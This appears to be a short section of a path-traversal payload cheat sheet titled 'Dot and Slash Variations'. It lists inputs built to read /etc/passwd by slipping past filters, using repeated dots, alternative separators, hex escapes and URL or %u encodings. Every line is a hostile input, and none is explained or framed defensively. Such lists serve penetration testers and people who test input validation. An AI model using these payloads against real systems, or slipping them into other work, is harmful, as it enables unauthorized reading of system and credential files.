# Dot and Slash Variations

Multiple dots:
....//....//....//etc/passwd
......////......////......////etc/passwd

Different separators:
..;/..;/..;/etc/passwd
..|/..|/..|/etc/passwd
..\x2f..\x2f..\x2fetc\x2fpasswd

URL encoded:
%2e%2e/%2e%2e/%2e%2e/etc/passwd
%u002e%u002e/%u002e%u002e/%u002e%u002e/etc/passwd
